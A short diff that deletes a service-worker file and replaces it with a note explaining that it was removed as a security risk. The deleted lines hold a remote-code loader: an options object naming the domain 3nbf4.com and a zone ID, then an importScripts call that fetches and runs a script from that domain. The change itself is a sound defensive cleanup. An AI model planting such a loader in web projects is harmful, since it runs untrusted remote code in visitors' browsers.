@@ -1,6 +1,5 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 11654436
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+# REMOVED: /333
+
+This file contained an importScripts call to a third-party domain (https://3nbf4.com/act/files/service-worker.min.js?r=sw) which poses a security risk when executed in a Service Worker context.
+
+To avoid executing untrusted remote code, the file content has been replaced on branch remove-untrusted-files. Please review the original file in commit history if needed.
